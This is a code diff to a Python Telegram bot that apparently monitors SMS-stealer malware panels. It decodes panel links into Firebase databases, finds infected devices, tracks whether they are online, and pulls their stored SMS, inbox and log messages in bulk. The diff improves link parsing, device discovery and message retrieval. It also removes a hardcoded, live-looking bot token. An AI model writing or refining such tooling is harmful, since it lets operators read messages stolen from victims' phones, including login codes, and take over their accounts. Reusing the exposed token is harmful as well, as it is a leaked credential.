@@ -20,10 +20,10 @@ import logging
 import httpx
 from datetime import datetime, timedelta
 from pathlib import Path
-from urllib.parse import parse_qs, urlparse, unquote, quote
+from urllib.parse import parse_qs, urlparse, unquote, quote, urlencode
 from typing import Dict, List, Optional, Tuple
 
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, Update
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
     Application,
     CommandHandler,
@@ -40,7 +40,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ─── CONFIG ───────────────────────────────────────────────────────────────────
-BOT_TOKEN = "8989140252:AAFAtBdv9Zr0oU1sb2R0_qBNw4ghvLA_15c"   # <-- Replace with your actual token
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "0") or 0)
 
 STATE_FILE = Path(__file__).parent / "bot_state.json"
@@ -119,22 +119,43 @@ def decode_profex(s):
     return None, None
 
 def get_panel_api_url(panel_url):
-    parsed = urlparse(panel_url)
-    qs = parse_qs(parsed.query)
-    s_param = qs.get('s', [''])[0]
-    url, key = decode_zxkai(s_param)
-    if url: return url.rstrip('/'), key
-    url, key = decode_profex(s_param)
-    if url: return url.rstrip('/'), key
-    if ".firebaseio.com" in parsed.netloc:
-        url = panel_url.split('?')[0].split('.json')[0].rstrip('/')
-        key = ""
-        for k, v in qs.items():
-            if k.lower() in ['key', 'auth', 'secret']:
-                key = v[0]
-                break
+    """Normalize supported Firebase database links into a REST base URL and auth key."""
+    try:
+        panel_url = unquote(panel_url.strip())
+        parsed = urlparse(panel_url)
+        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
+            return None, None
+        qs = parse_qs(parsed.query)
+        s_param = qs.get("s", [""])[0]
+        url, key = decode_zxkai(s_param)
+        if not url:
+            url, key = decode_profex(s_param)
+        if url:
+            return url.rstrip("/"), key or ""
+        host = parsed.netloc.lower()
+        is_firebase = host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")
+        if not is_firebase:
+            return None, None
+        path = parsed.path
+        if path.endswith(".json"):
+            path = path[:-5]
+        url = f"{parsed.scheme}://{parsed.netloc}{path}".rstrip("/")
+        key = next((v[0] for k, v in qs.items() if k.lower() in {"key", "auth", "secret"} and v), "")
         return url, key
-    return None, None
+    except Exception:
+        return None, None
+
+def firebase_json_url(api_url, path="", auth_key="", **params):
+    """Build a valid Firebase REST URL without dangling '&' or malformed query strings."""
+    base = api_url.rstrip("/")
+    clean_path = "/".join(str(path).strip("/").split("/") if path else [])
+    url = f"{base}/{clean_path}" if clean_path else base
+    if not url.endswith(".json"):
+        url += "/.json"
+    query = dict(params)
+    if auth_key:
+        query["auth"] = auth_key
+    return f"{url}?{urlencode(query)}" if query else url
 
 # ─── API HELPERS ──────────────────────────────────────────────────────────────
 async def api_fetch(client, url, timeout=15):
@@ -151,12 +172,11 @@ def is_valid_device_id(k):
     if not isinstance(k, str): return False
     if k.lower() in ["messages", "clients", "devices", "users", "all_devices", "nodes", "settings", "sms", "logs"]:
         return False
-    return 8 <= len(k) <= 45
+    return 3 <= len(k) <= 100
 
 async def discover_structure(client, api_url, auth_key):
-    """Find device_node and message_node."""
-    auth_suffix = f"?auth={auth_key}" if auth_key else ""
-    root_data, error = await api_fetch(client, f"{api_url}/.json{auth_suffix}&shallow=true")
+    """Find device and message nodes in common Firebase layouts."""
+    root_data, error = await api_fetch(client, firebase_json_url(api_url, auth_key=auth_key, shallow="true"))
     if root_data and isinstance(root_data, dict):
         keys = list(root_data.keys())
         device_ids = [k for k in keys if is_valid_device_id(k)]
@@ -166,71 +186,88 @@ async def discover_structure(client, api_url, auth_key):
             return "", ""
         for node in ["clients", "devices", "users", "all_devices", "nodes"]:
             if node in keys:
-                node_data, _ = await api_fetch(client, f"{api_url}/{node}.json{auth_suffix}&shallow=true")
+                node_data, _ = await api_fetch(client, firebase_json_url(api_url, node, auth_key, shallow="true"))
                 if node_data and isinstance(node_data, dict):
                     if any(is_valid_device_id(k) for k in node_data.keys()):
-                        msg_node = node
-                        for m_node in ["messages", "sms", "logs"]:
-                            if m_node in keys:
-                                msg_node = m_node
-                                break
+                        # Messages are often stored inside each device; get_messages()
+                        # will inspect the device object and select that child node.
+                        msg_node = next((m for m in ["messages", "sms", "logs"] if m in keys), "")
                         return node, msg_node
     return None, error
 
 async def get_device_list(client, api_url, auth_key, device_node):
     """Return list of device IDs (shallow)."""
-    auth_suffix = f"?auth={auth_key}" if auth_key else ""
-    path = f"/{device_node}" if device_node else ""
-    url = f"{api_url}{path}/.json{auth_suffix}&shallow=true"
+    path = device_node or ""
+    url = firebase_json_url(api_url, path, auth_key, shallow="true")
     data, error = await api_fetch(client, url, 15)
     if error: return None, error
     if not data or not isinstance(data, dict): return [], None
     return [k for k in data.keys() if is_valid_device_id(k)], None
 
 async def get_device_data(client, api_url, auth_key, device_node, device_id) -> Optional[dict]:
-    auth_suffix = f"?auth={auth_key}" if auth_key else ""
-    path = f"/{device_node}" if device_node else ""
-    url = f"{api_url}{path}/{device_id}/.json{auth_suffix}"
+    path = f"{device_node}/{device_id}" if device_node else device_id
+    url = firebase_json_url(api_url, path, auth_key)
     data, _ = await api_fetch(client, url, 10)
     return data if isinstance(data, dict) else None
 
 async def get_messages(client, api_url, auth_key, message_node, device_id, cursor=None, limit: int = 500) -> dict:
-    path = f"/{message_node}" if message_node else ""
-    params = ['orderBy="%24key"']
+    path = f"{message_node}/{device_id}" if message_node else device_id
+    params = []
     if cursor:
-        cursor_encoded = quote(str(cursor), safe="")
-        params.append(f'startAt="{cursor_encoded}"')
+        safe_cursor = str(cursor).replace('"', '\\"')
+        params.append(f'startAt="{safe_cursor}"')
         params.append(f"limitToFirst={limit}")
     else:
         params.append(f"limitToLast={limit}")
-    if auth_key:
-        auth_encoded = quote(str(auth_key), safe="")
-        params.append(f"auth={auth_encoded}")
-    url = f'{api_url}{path}/{device_id}/.json?' + "&".join(params)
+    params.insert(0, 'orderBy="%24key"')
+    url = firebase_json_url(api_url, path, auth_key)
+    url += "&" + "&".join(params) if params else ""
     data, _ = await api_fetch(client, url, 30)
-    return data if isinstance(data, dict) else {}
+    if not isinstance(data, dict):
+        return {}
+    # Some panels keep messages below each device instead of a global node.
+    for child in ("messages", "sms", "logs", "inbox", "received"):
+        child_data = data.get(child)
+        if isinstance(child_data, dict):
+            return child_data
+    return data
 
 def is_device_online(device_data: dict) -> bool:
     """Check if device is online based on known fields."""
     if not device_data: return False
     # Direct boolean
     if 'online' in device_data:
-        return bool(device_data['online'])
+        value = device_data['online']
+        if isinstance(value, str):
+            return value.strip().lower() in {'true', '1', 'yes', 'online', 'connected'}
+        return value is True or (isinstance(value, (int, float)) and value == 1)
     if 'status' in device_data:
         if isinstance(device_data['status'], str):
-            return device_data['status'].lower() == 'online'
+            return device_data['status'].strip().lower() in {'online', 'connected', 'active', 'true', '1'}
         if isinstance(device_data['status'], bool):
             return device_data['status']
+    for field in ['connected', 'isOnline', 'is_online']:
+        value = device_data.get(field)
+        if isinstance(value, str):
+            if value.strip().lower() in {'true', '1', 'yes', 'online', 'connected'}:
+                return True
+        elif value is True or (isinstance(value, (int, float)) and value == 1):
+            return True
     # lastSeen within last 5 minutes
-    for field in ['lastSeen', 'lastActivity', 'last_online']:
+    for field in ['lastSeen', 'last_seen', 'lastActivity', 'last_activity', 'last_online', 'updatedAt']:
+
         if field in device_data:
             val = device_data[field]
             try:
                 # Could be timestamp (int/float) or ISO string
                 if isinstance(val, (int, float)):
-                    dt = datetime.fromtimestamp(val)
+                    # Firebase/mobile clients often store Unix time in milliseconds.
+                    seconds = val / 1000 if val > 10_000_000_000 else val
+                    dt = datetime.fromtimestamp(seconds, tz=datetime.now().astimezone().tzinfo)
                 elif isinstance(val, str):
                     dt = datetime.fromisoformat(val.replace('Z', '+00:00'))
+                    if dt.tzinfo is None:
+                        dt = dt.astimezone()
                 else:
                     continue
                 if datetime.now().astimezone() - dt < timedelta(minutes=5):
@@ -701,7 +738,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [InlineKeyboardButton("⏹ Stop Monitoring", callback_data="stop_monitor")],
             [InlineKeyboardButton("🔙 Back to Panels", callback_data="monitor_panels")],
-            [InlineKeyboardButton("🎲 Random Device", callback_data=f"random_device:{panel_key}")]
+
         ]
         markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -766,7 +803,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [InlineKeyboardButton("⏹ Stop Monitoring", callback_data="stop_monitor")],
             [InlineKeyboardButton("🔙 Back to Panels", callback_data="monitor_panels")],
-            [InlineKeyboardButton("🎲 Random Device", callback_data=f"random_device:{panel_key}")]
+
         ]
         markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -798,13 +835,17 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         added = 0
         async with httpx.AsyncClient() as client:
             for link in links:
-                if not link.startswith('http'): continue
                 api_url, auth_key = get_panel_api_url(link)
-                if not api_url: continue
+                if not api_url:
+                    await update.message.reply_text(f"⚠️ Valid Firebase link nahi mila: {link[:120]}")
+                    continue
                 # discovery
                 dev_node, msg_node = await discover_structure(client, api_url, auth_key)
                 if dev_node is None:
-                    await update.message.reply_text(f"⚠️ Structure not found for {link}")
+                    await update.message.reply_text(f"⚠️ Firebase structure/access nahi mila for {link}")
+                    continue
+                if any(pc.get("api_url") == api_url for pc in panels.values()):
+                    await update.message.reply_text(f"⚠️ Panel pehle se added hai: {link[:120]}")
                     continue
                 pid = f"p_{int(time.time())}_{added}_{len(panels)}"
                 panels[pid] = {
